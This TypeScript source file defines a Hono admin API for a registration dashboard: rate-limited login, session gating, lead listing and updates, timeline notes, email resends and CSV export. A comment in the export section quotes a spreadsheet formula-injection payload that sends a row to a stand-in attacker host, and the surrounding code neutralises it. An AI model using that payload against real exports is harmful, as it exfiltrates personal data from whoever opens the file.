import { Hono } from "hono";
import type { Context } from "hono";
import { randomBytes } from "node:crypto";
import { z } from "zod";
import { prisma } from "../db";
import { rateLimit } from "../security/rate-limit";
import { audit, pseudonymise } from "../security/audit";
import {
  clearStaffSession,
  issueStaffSession,
  readStaffSession,
  requireAdmin,
  sha256Hex,
  verifyAdminCredentials,
} from "../security/staff-session";
import {
  EMPLOYER_PIPELINE_STAGES,
  FOLLOW_UP_STATUSES,
  PILOT_PRIORITIES,
  REGISTRATION_STATUSES,
  SEGMENTS,
  registrationNoteSchema,
  type Segment,
} from "../types";
import { diffEvents, recordEvent, recordEvents, serialiseEvent } from "../registration-events";
import { sendMail, TRANSPORT_KIND } from "../email/mailer";
import { OUTBOX_ENABLED, readOutbox } from "../email/outbox";
import { confirmationFor } from "../email/templates";
import { IDENTITY_BY_SEGMENT, PARTNERSHIPS } from "../email/identities";

const adminRouter = new Hono();

/**
 * Admin dashboard API. Every route below the login is behind `requireAdmin()`.
 *
 * This surface is not linked from anywhere public, but "not linked" is not a
 * control — the control is the session gate plus the audit trail. Assume the
 * URL is known.
 */

/* ------------------------------------------------------------------ LOGIN */

/*
 * 5 attempts per 15 minutes per IP. A brute-force ceiling: at this rate an
 * attacker gets ~175,000 guesses a century. Applied to the login route only,
 * so an admin who is already in is never throttled while working.
 */
adminRouter.use("/login", rateLimit({ name: "admin:login", limit: 5, windowMs: 15 * 60_000 }));

const loginSchema = z.object({
  username: z.string().trim().min(1).max(120),
  password: z.string().min(1).max(400),
});

adminRouter.post("/login", async (c) => {
  let body: unknown;
  try {
    body = await c.req.json();
  } catch {
    return c.json({ error: { message: "Invalid request.", code: "BAD_REQUEST" } }, 400);
  }

  const parsed = loginSchema.safeParse(body);
  if (!parsed.success) {
    return c.json({ error: { message: "Incorrect username or password.", code: "BAD_CREDENTIALS" } }, 401);
  }

  const result = verifyAdminCredentials(parsed.data.username, parsed.data.password);

  if (result.unconfigured) {
    audit({ action: "admin.login", actor: "anonymous", outcome: "denied", requestId: c.get("requestId") });
    return c.json(
      {
        error: {
          message: "Admin access is not configured for this deployment.",
          code: "ADMIN_NOT_CONFIGURED",
        },
      },
      503,
    );
  }

  if (!result.ok) {
    audit({
      action: "admin.login",
      actor: pseudonymise(parsed.data.username),
      outcome: "failure",
      requestId: c.get("requestId"),
    });
    // One message for a wrong username and a wrong password. Anything else is
    // a username-enumeration oracle.
    return c.json({ error: { message: "Incorrect username or password.", code: "BAD_CREDENTIALS" } }, 401);
  }

  issueStaffSession(c, { aud: "admin", sub: parsed.data.username.trim().toLowerCase() });
  audit({
    action: "admin.login",
    actor: parsed.data.username.trim().toLowerCase(),
    outcome: "success",
    requestId: c.get("requestId"),
  });

  return c.json({ data: { username: parsed.data.username.trim().toLowerCase() } });
});

adminRouter.post("/logout", async (c) => {
  const session = readStaffSession(c, "admin");
  clearStaffSession(c, "admin");
  if (session) audit({ action: "admin.logout", actor: session.sub, outcome: "success" });
  return c.json({ data: { ok: true } });
});

adminRouter.get("/session", async (c) => {
  const session = readStaffSession(c, "admin");
  if (!session) return c.json({ data: { authenticated: false as const, username: null } });
  return c.json({ data: { authenticated: true as const, username: session.sub } });
});

/* ------------------------------------------- EVERYTHING BELOW IS PROTECTED */

adminRouter.use("/registrations", requireAdmin());
adminRouter.use("/registrations/*", requireAdmin());
adminRouter.use("/stats", requireAdmin());
adminRouter.use("/export", requireAdmin());
adminRouter.use("/demo-access", requireAdmin());
adminRouter.use("/vocabulary", requireAdmin());
adminRouter.use("/outbox", requireAdmin());

/**
 * The development outbox: every message that could not be delivered because no
 * mail transport is configured.
 *
 * WHY the portal can read it: without a transport, a verification code, an
 * administrator recovery code and a demonstration invitation all go nowhere, and
 * no journey can be walked end to end. This is the only place those messages
 * survive, so it is what makes the platform usable before mail credentials
 * exist.
 *
 * Returns 404 in production rather than 403. The endpoint genuinely does not
 * exist there — `readOutbox()` is inert and nothing is ever written — and a 403
 * would advertise a plaintext-code reader that a live deployment must not have.
 */
adminRouter.get("/outbox", (c) => {
  if (!OUTBOX_ENABLED) {
    return c.json({ error: { message: "Not found.", code: "NOT_FOUND" } }, 404);
  }
  return c.json({
    data: {
      transport: TRANSPORT_KIND,
      /** False whenever this list can have entries: the two are exclusive. */
      delivering: TRANSPORT_KIND !== "log",
      messages: readOutbox(),
    },
  });
});

function parseDetails(raw: string): Record<string, unknown> {
  try {
    const parsed = JSON.parse(raw) as unknown;
    return parsed && typeof parsed === "object" ? (parsed as Record<string, unknown>) : {};
  } catch {
    return {};
  }
}

type RegistrationRow = Awaited<ReturnType<typeof prisma.registration.findFirst>>;

function serialise(row: NonNullable<RegistrationRow>) {
  return {
    id: row.id,
    segment: row.segment,
    communityName: row.communityName,
    stage: row.stage,
    status: row.status,
    fullName: row.fullName,
    email: row.email,
    phone: row.phone,
    organisation: row.organisation,
    jobTitle: row.jobTitle,
    location: row.location,
    details: parseDetails(row.details),
    privacyAccepted: row.privacyAccepted,
    privacyAcceptedAt: row.privacyAcceptedAt?.toISOString() ?? null,
    marketingConsent: row.marketingConsent,
    marketingConsentAt: row.marketingConsentAt?.toISOString() ?? null,
    consentText: row.consentText,
    sourcePage: row.sourcePage,
    formType: row.formType,
    source: row.source,
    utmSource: row.utmSource,
    utmCampaign: row.utmCampaign,
    referrer: row.referrer,
    followUpStatus: row.followUpStatus,
    assignedTeam: row.assignedTeam,
    assignedTo: row.assignedTo,
    pilotPriority: row.pilotPriority,
    pipelineStage: row.pipelineStage,
    internalNotes: row.internalNotes,
    qualified: row.qualified,
    lastContactAt: row.lastContactAt?.toISOString() ?? null,
    confirmationSentAt: row.confirmationSentAt?.toISOString() ?? null,
    notificationSentAt: row.notificationSentAt?.toISOString() ?? null,
    emailDeliveryNote: row.emailDeliveryNote,
    demoInvitationStatus: row.demoInvitationStatus,
    createdAt: row.createdAt.toISOString(),
    updatedAt: row.updatedAt.toISOString(),
  };
}

/* ------------------------------------------------------------------ STATS */

adminRouter.get("/stats", async (c) => {
  const [total, bySegment, byStatus, recent, invitations] = await Promise.all([
    prisma.registration.count(),
    prisma.registration.groupBy({ by: ["segment"], _count: { _all: true } }),
    prisma.registration.groupBy({ by: ["status"], _count: { _all: true } }),
    prisma.registration.count({
      where: { createdAt: { gte: new Date(Date.now() - 7 * 24 * 60 * 60 * 1000) } },
    }),
    prisma.demoInvitation.count({ where: { revokedAt: null } }),
  ]);

  const segmentCounts: Record<string, number> = {
    employee: 0,
    employer: 0,
    capital_partner: 0,
    general: 0,
  };
  for (const row of bySegment) segmentCounts[row.segment] = row._count._all;

  return c.json({
    data: {
      total,
      lastSevenDays: recent,
      employee: segmentCounts.employee,
      employer: segmentCounts.employer,
      capitalPartner: segmentCounts.capital_partner,
      general: segmentCounts.general,
      demoInvitations: invitations,
      byStatus: Object.fromEntries(byStatus.map((r) => [r.status, r._count._all])),
    },
  });
});

adminRouter.get("/vocabulary", (c) =>
  c.json({
    data: {
      segments: SEGMENTS,
      statuses: REGISTRATION_STATUSES,
      followUpStatuses: FOLLOW_UP_STATUSES,
      pilotPriorities: PILOT_PRIORITIES,
      pipelineStages: EMPLOYER_PIPELINE_STAGES,
    },
  }),
);

/* ---------------------------------------------------------------- LISTING */

const listQuerySchema = z.object({
  segment: z.enum(SEGMENTS).optional(),
  status: z.string().max(60).optional(),
  q: z.string().max(120).optional(),
  take: z.coerce.number().int().min(1).max(200).default(50),
  skip: z.coerce.number().int().min(0).max(100_000).default(0),
});

function buildWhere(query: z.infer<typeof listQuerySchema>) {
  const where: Record<string, unknown> = {};
  if (query.segment) where.segment = query.segment;
  if (query.status) where.status = query.status;
  if (query.q) {
    const term = query.q.trim();
    if (term.length > 0) {
      // Prisma builds a parameterised LIKE/ILIKE — the term is never
      // concatenated into SQL. `mode: "insensitive"` is explicit here because
      // Postgres's LIKE is case-sensitive by default, unlike SQLite's.
      where.OR = [
        { fullName: { contains: term, mode: "insensitive" } },
        { email: { contains: term, mode: "insensitive" } },
        { organisation: { contains: term, mode: "insensitive" } },
        { location: { contains: term, mode: "insensitive" } },
      ];
    }
  }
  return where;
}

adminRouter.get("/registrations", async (c) => {
  const parsed = listQuerySchema.safeParse(c.req.query());
  if (!parsed.success) {
    return c.json({ error: { message: "Invalid filter.", code: "VALIDATION_ERROR" } }, 400);
  }

  const where = buildWhere(parsed.data);
  const [rows, total] = await Promise.all([
    prisma.registration.findMany({
      where,
      orderBy: { createdAt: "desc" },
      take: parsed.data.take,
      skip: parsed.data.skip,
    }),
    prisma.registration.count({ where }),
  ]);

  return c.json({ data: { items: rows.map(serialise), total } });
});

adminRouter.get("/registrations/:id", async (c) => {
  const row = await prisma.registration.findUnique({
    where: { id: c.req.param("id") },
    include: {
      invitations: { orderBy: { createdAt: "desc" } },
      /*
       * Newest first, capped at 200. A lead worked for a year will not have 200
       * events; a lead caught in an integration loop might, and the drawer must
       * not try to render an unbounded list.
       */
      events: { orderBy: { createdAt: "desc" }, take: 200 },
    },
  });
  if (!row) return c.json({ error: { message: "Not found.", code: "NOT_FOUND" } }, 404);

  return c.json({
    data: {
      ...serialise(row),
      events: row.events.map(serialiseEvent),
      invitations: row.invitations.map((inv) => ({
        id: inv.id,
        tokenHint: inv.tokenHint,
        email: inv.email,
        portal: inv.portal,
        issuedBy: inv.issuedBy,
        expiresAt: inv.expiresAt.toISOString(),
        redeemedAt: inv.redeemedAt?.toISOString() ?? null,
        revokedAt: inv.revokedAt?.toISOString() ?? null,
        useCount: inv.useCount,
        maxUses: inv.maxUses,
        createdAt: inv.createdAt.toISOString(),
      })),
    },
  });
});

/* ----------------------------------------------------------------- UPDATE */

const updateSchema = z.object({
  status: z.enum(REGISTRATION_STATUSES).optional(),
  followUpStatus: z.enum(FOLLOW_UP_STATUSES).optional(),
  pilotPriority: z.enum(PILOT_PRIORITIES).optional(),
  pipelineStage: z.enum(EMPLOYER_PIPELINE_STAGES).optional(),
  assignedTeam: z.string().trim().max(120).nullable().optional(),
  assignedTo: z.string().trim().max(120).nullable().optional(),
  internalNotes: z.string().max(8000).nullable().optional(),
  qualified: z.boolean().nullable().optional(),
  markContactedNow: z.boolean().optional(),
});

adminRouter.patch("/registrations/:id", async (c) => {
  const session = c.get("staff");
  let body: unknown;
  try {
    body = await c.req.json();
  } catch {
    return c.json({ error: { message: "Invalid request.", code: "BAD_REQUEST" } }, 400);
  }

  const parsed = updateSchema.safeParse(body);
  if (!parsed.success) {
    const fields = [...new Set(parsed.error.issues.map((i) => String(i.path[0] ?? "body")))];
    return c.json({ error: { message: "Invalid update.", code: "VALIDATION_ERROR", fields } }, 400);
  }

  const { markContactedNow, ...patch } = parsed.data;
  const data: Record<string, unknown> = { ...patch };
  if (markContactedNow) data.lastContactAt = new Date();

  if (Object.keys(data).length === 0) {
    return c.json({ error: { message: "Nothing to update.", code: "NO_CHANGES" } }, 400);
  }

  const id = c.req.param("id");

  /*
   * Read before write. WHY: the timeline needs the value being replaced, and
   * once the UPDATE lands it is gone — these columns are last-write-wins. This
   * is not a race-free read-modify-write and does not need to be: two admins
   * editing the same lead in the same second is not a real scenario, and the
   * worst case is one timeline row showing a stale "from" value while the
   * final state is still whatever was written last.
   */
  const before = await prisma.registration.findUnique({ where: { id } });
  if (!before) return c.json({ error: { message: "Not found.", code: "NOT_FOUND" } }, 404);

  const row = await prisma.registration.update({ where: { id }, data }).catch(() => null);
  if (!row) return c.json({ error: { message: "Not found.", code: "NOT_FOUND" } }, 404);

  const actor = session?.sub ?? "unknown";

  // One timeline row per field that genuinely moved, plus the contact stamp.
  await recordEvents([
    ...diffEvents(row.id, before as unknown as Record<string, unknown>, patch, actor),
    ...(markContactedNow
      ? [
          {
            registrationId: row.id,
            kind: "contacted" as const,
            actor,
            message: "Marked as contacted.",
          },
        ]
      : []),
  ]);

  /*
   * Audit the FIELD NAMES that changed, not the values. "Who moved this lead to
   * Approved" is the question an audit answers; copying internal notes into
   * log storage would just create a second, less-protected copy of them.
   */
  audit({
    action: "admin.registration.update",
    actor: session?.sub ?? "unknown",
    outcome: "success",
    target: row.id,
    requestId: c.get("requestId"),
    detail: { fields: Object.keys(data) },
  });

  return c.json({ data: serialise(row) });
});

/* --------------------------------------------------------------- NOTES */

/**
 * Append a note to the timeline.
 *
 * WHY a separate endpoint rather than PATCHing `internalNotes`: that field is a
 * single string, so two people working the same lead overwrite each other and
 * the earlier note is simply gone. Notes are the record of *why* a decision was
 * made — for a pilot pipeline that decides who gets access to a financial
 * product, losing that silently is the wrong default. The old field stays for
 * at-a-glance context; the timeline is the history.
 */
adminRouter.post("/registrations/:id/notes", async (c) => {
  const session = c.get("staff");
  let body: unknown;
  try {
    body = await c.req.json();
  } catch {
    return c.json({ error: { message: "Invalid request.", code: "BAD_REQUEST" } }, 400);
  }

  const parsed = registrationNoteSchema.safeParse(body);
  if (!parsed.success) {
    const fields = [...new Set(parsed.error.issues.map((i) => String(i.path[0] ?? "body")))];
    return c.json(
      { error: { message: parsed.error.issues[0]?.message ?? "Invalid note.", code: "VALIDATION_ERROR", fields } },
      400,
    );
  }

  const id = c.req.param("id");
  const row = await prisma.registration.findUnique({ where: { id }, select: { id: true } });
  if (!row) return c.json({ error: { message: "Not found.", code: "NOT_FOUND" } }, 404);

  const actor = session?.sub ?? "unknown";

  await recordEvent({
    registrationId: row.id,
    kind: "note",
    actor,
    message: parsed.data.message,
  });

  if (parsed.data.markContacted) {
    await prisma.registration
      .update({ where: { id: row.id }, data: { lastContactAt: new Date() } })
      .catch(() => null);
    await recordEvent({
      registrationId: row.id,
      kind: "contacted",
      actor,
      message: "Marked as contacted alongside a note.",
    });
  }

  // The note BODY is not audited — see the timeline model comment. The audit
  // records that a note was written, by whom, against which lead.
  audit({
    action: "admin.registration.note",
    actor,
    outcome: "success",
    target: row.id,
    requestId: c.get("requestId"),
  });

  const events = await prisma.registrationEvent.findMany({
    where: { registrationId: row.id },
    orderBy: { createdAt: "desc" },
    take: 200,
  });

  return c.json({ data: { events: events.map(serialiseEvent) } });
});

/* ------------------------------------------------------- RESEND WELCOME */

adminRouter.post("/registrations/:id/resend-welcome", async (c) => {
  const session = c.get("staff");
  const row = await prisma.registration.findUnique({ where: { id: c.req.param("id") } });
  if (!row) return c.json({ error: { message: "Not found.", code: "NOT_FOUND" } }, 404);

  const details = parseDetails(row.details);
  const enquiryType = typeof details.enquiryType === "string" ? details.enquiryType : "General enquiry";
  const email = confirmationFor(row.segment as Segment, enquiryType);

  const outcome = await sendMail({
    to: row.email,
    from: email.from,
    subject: email.subject,
    text: email.text,
    html: email.html,
  });

  await prisma.registration.update({
    where: { id: row.id },
    data: {
      confirmationSentAt: outcome.delivered ? new Date() : row.confirmationSentAt,
      emailDeliveryNote: `resend: ${outcome.note}`,
    },
  });

  await recordEvent({
    registrationId: row.id,
    kind: "email_sent",
    actor: session?.sub ?? "unknown",
    message: outcome.delivered
      ? `Welcome email resent by hand (${outcome.note}).`
      : `Manual welcome resend FAILED (${outcome.note}).`,
  });

  audit({
    action: "admin.welcome.resent",
    actor: session?.sub ?? "unknown",
    outcome: outcome.delivered ? "success" : "failure",
    target: row.id,
    requestId: c.get("requestId"),
  });

  return c.json({ data: { delivered: outcome.delivered, note: outcome.note } });
});

/* ------------------------------------------------------- DEMO INVITATIONS */

/*
 * Creating, listing, resending, extending and revoking demonstration
 * invitations now lives in routes/admin-invitations.ts, mounted at
 * /api/admin/invitations ahead of this router.
 *
 * WHY it moved rather than being extended here: the old implementation issued a
 * LINK containing a 32-byte token. That put a working demonstration credential
 * into a URL — and therefore into browser history, Referer headers, proxy logs
 * and any screenshot of the address bar. The replacement issues a short readable
 * code that is only usable together with the invited email address, and never
 * appears in a URL at all.
 */

/** Who opened the private demo, and when. */
adminRouter.get("/demo-access", async (c) => {
  const rows = await prisma.demoAccessLog.findMany({ orderBy: { createdAt: "desc" }, take: 200 });
  return c.json({
    data: rows.map((r) => ({
      id: r.id,
      invitationId: r.invitationId,
      email: r.email,
      method: r.method,
      outcome: r.outcome,
      path: r.path,
      createdAt: r.createdAt.toISOString(),
    })),
  });
});

/* -------------------------------------------------------------- CSV EXPORT */

/**
 * RFC 4180 quoting PLUS formula-injection neutralisation.
 *
 * WHY the leading apostrophe on =, +, -, @, tab and CR: a registrant who types
 * `=HYPERLINK("https://evil.example/"&A1,"Open")` into a free-text field has
 * written a formula that Excel executes when a PayBridge employee opens the
 * export — exfiltrating the row to an attacker's server on a single click.
 * The field is still readable; it is simply no longer executable.
 */
function csvCell(value: unknown): string {
  const raw = value === null || value === undefined ? "" : String(value);
  const neutralised = /^[=+\-@\t\r]/.test(raw) ? `'${raw}` : raw;
  return `"${neutralised.replace(/"/g, '""')}"`;
}

adminRouter.get("/export", async (c) => {
  const session = c.get("staff");
  const parsed = listQuerySchema.safeParse(c.req.query());
  if (!parsed.success) {
    return c.json({ error: { message: "Invalid filter.", code: "VALIDATION_ERROR" } }, 400);
  }

  const rows = await prisma.registration.findMany({
    where: buildWhere(parsed.data),
    orderBy: { createdAt: "desc" },
    take: 5000,
  });

  const headers = [
    "id",
    "created_at",
    "segment",
    "community_name",
    "stage",
    "status",
    "full_name",
    "email",
    "phone",
    "organisation",
    "job_title",
    "location",
    "privacy_accepted_at",
    "marketing_consent",
    "marketing_consent_at",
    "source_page",
    "form_type",
    "utm_source",
    "utm_campaign",
    "referrer",
    "follow_up_status",
    "assigned_team",
    "assigned_to",
    "pilot_priority",
    "pipeline_stage",
    "qualified",
    "last_contact_at",
    "demo_invitation_status",
    "internal_notes",
    "details_json",
  ];

  const lines = [headers.join(",")];
  for (const r of rows) {
    lines.push(
      [
        r.id,
        r.createdAt.toISOString(),
        r.segment,
        r.communityName,
        r.stage,
        r.status,
        r.fullName,
        r.email,
        r.phone,
        r.organisation,
        r.jobTitle,
        r.location,
        r.privacyAcceptedAt?.toISOString() ?? "",
        r.marketingConsent ? "yes" : "no",
        r.marketingConsentAt?.toISOString() ?? "",
        r.sourcePage,
        r.formType,
        r.utmSource,
        r.utmCampaign,
        r.referrer,
        r.followUpStatus,
        r.assignedTeam,
        r.assignedTo,
        r.pilotPriority,
        r.pipelineStage,
        r.qualified === null ? "" : r.qualified ? "yes" : "no",
        r.lastContactAt?.toISOString() ?? "",
        r.demoInvitationStatus,
        r.internalNotes,
        r.details,
      ]
        .map(csvCell)
        .join(","),
    );
  }

  // Bulk PII leaving the system is exactly the event an audit log exists for.
  audit({
    action: "admin.export.csv",
    actor: session?.sub ?? "unknown",
    outcome: "success",
    requestId: c.get("requestId"),
    detail: { rows: rows.length, segment: parsed.data.segment ?? "all" },
  });

  const stamp = new Date().toISOString().slice(0, 10);
  return new Response(`﻿${lines.join("\r\n")}\r\n`, {
    headers: {
      "Content-Type": "text/csv; charset=utf-8",
      "Content-Disposition": `attachment; filename="paybridge-registrations-${stamp}.csv"`,
      "Cache-Control": "no-store",
    },
  });
});

export { adminRouter };
